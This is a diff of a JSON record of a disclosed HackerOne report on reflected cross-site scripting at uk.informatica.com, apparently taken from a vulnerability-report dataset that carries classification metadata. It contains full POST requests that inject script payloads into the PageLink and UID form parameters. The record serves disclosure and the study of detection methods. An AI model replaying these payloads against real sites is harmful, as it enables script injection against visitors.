@@ -1,45 +1,46 @@
 {
-    "reported_to": "Informatica",
-    "reported_by": "grampae ",
-    "title": "[uk.informatica.com] XSS on uk.informatica..com",
-    "content": "\nThe following urls on uk.informatica.com:80 have XSS vulnerabilities, I have copied the POST header and data for both instances.\n\nhttp://uk.informatica.com:80/o/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the PageLink parameter being exploited with\n\" style=\"width:expression(prompt(1));\nPOST /o/Default.asp HTTP/1.1\nContent-Length: 779\nContent-Type: application/x-www-form-urlencoded\nReferer: http://uk.informatica.com:80/\nCookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British\nHost: uk.informatica.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: /\nOPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1\" style=\"width:expression(prompt(1));&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID=&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE\n\nhttp://uk.informatica.com:80/r/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the UID parameter being exploited with \"><script>prompt(1)</script> .\nPOST /r/Default.asp HTTP/1.1\nContent-Length: 779\nContent-Type: application/x-www-form-urlencoded\nReferer: http://uk.informatica.com:80/\nCookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British\nHost: uk.informatica.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: /\nOPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID=\"><script>prompt(1)</script>&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Informatica",
+  "reported_by": "grampae ",
+  "title": "[uk.informatica.com] XSS on uk.informatica..com",
+  "content": "\nThe following urls on uk.informatica.com:80 have XSS vulnerabilities, I have copied the POST header and data for both instances.\n\nhttp://uk.informatica.com:80/o/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the PageLink parameter being exploited with\n\" style=\"width:expression(prompt(1));\nPOST /o/Default.asp HTTP/1.1\nContent-Length: 779\nContent-Type: application/x-www-form-urlencoded\nReferer: http://uk.informatica.com:80/\nCookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British\nHost: uk.informatica.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: /\nOPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1\" style=\"width:expression(prompt(1));&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID=&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE\n\nhttp://uk.informatica.com:80/r/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the UID parameter being exploited with \"><script>prompt(1)</script> .\nPOST /r/Default.asp HTTP/1.1\nContent-Length: 779\nContent-Type: application/x-www-form-urlencoded\nReferer: http://uk.informatica.com:80/\nCookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British\nHost: uk.informatica.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: /\nOPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID=\"><script>prompt(1)</script>&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1488273300,
+  "report_url": "https://hackerone.com/reports/143323",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to http://uk.informatica.com:80/o/Default.asp or http://uk.informatica.com:80/r/Default.asp"
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Cross-site Scripting (XSS) - Generic"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1488273300,
-    "report_url": "https://hackerone.com/reports/143323",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Navigate to http://uk.informatica.com:80/o/Default.asp or http://uk.informatica.com:80/r/Default.asp"
-        ],
-        [
-            2,
-            "Inject the XSS payload into the vulnerable parameters (PageLink, ResponseHandlingLanguage, UID) as shown in the report"
-        ]
-    ],
-    "vuln_description": "The vulnerability involves reflected Cross-Site Scripting (XSS) on uk.informatica.com, where user-supplied input in parameters (PageLink, ResponseHandlingLanguage, UID) is not properly sanitized before being reflected in the response. This allows attackers to execute arbitrary JavaScript code in the context of the victim's browser session.",
-    "reason": "The attack is straightforward with no complex interactions between components or application states. The vulnerability is discovered by simple input manipulation in URL parameters, a common testing technique for XSS.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "injection_metadata": {
-        "is_simple_payload": true
-    },
-    "authnz_metadata": {
-        "reason": "The XSS vulnerabilities reported involve injecting malicious scripts into parameters (PageLink, ResponseHandlingLanguage, UID) via POST requests. The proposed methodologies focus on authentication and authorization bypasses (AuthN/AuthZ) and Insecure Direct Object References (IDOR) by manipulating user sessions and resource IDs. Since XSS is a client-side vulnerability that does not directly involve AuthN/AuthZ or IDOR, it would not be detectable using the described methodologies.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Inject the XSS payload into the vulnerable parameters (PageLink, ResponseHandlingLanguage, UID) as shown in the report"
+    ]
+  ],
+  "vuln_description": "The vulnerability involves reflected Cross-Site Scripting (XSS) on uk.informatica.com, where user-supplied input in parameters (PageLink, ResponseHandlingLanguage, UID) is not properly sanitized before being reflected in the response. This allows attackers to execute arbitrary JavaScript code in the context of the victim's browser session.",
+  "reason": "The attack is straightforward with no complex interactions between components or application states. The vulnerability is discovered by simple input manipulation in URL parameters, a common testing technique for XSS.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "reasoning": "The reported XSS vulnerabilities involve injecting basic payloads (e.g., `\" style=\"width:expression(prompt(1));` and `\"><script>prompt(1)</script>`) into POST parameters (PageLink, UID). These payloads are generic, non-filter-bypassing, and detectable in the same HTTP response (reflected XSS). The methodology's steps 1-4 would log parameters during regular navigation, test them with simple payloads, and detect execution in the same channel (response). Thus, the vulnerabilities align with the methodology.",
+    "is_simple_injection": true
+  },
+  "authnz_metadata": {
+    "reason": "The XSS vulnerabilities reported involve injecting malicious scripts into parameters (PageLink, ResponseHandlingLanguage, UID) of POST requests to specific endpoints (/o/Default.asp and /r/Default.asp). The proposed methodology focuses on authentication and authorization bypasses (AuthN/AuthZ) and Insecure Direct Object References (IDOR) by testing different combinations of user sessions, actions, and resource IDs. Since XSS is a client-side vulnerability related to input validation and output encoding rather than authorization boundaries, it falls outside the scope of the described methodologies.",
+    "is_detectable": false
+  }
 }
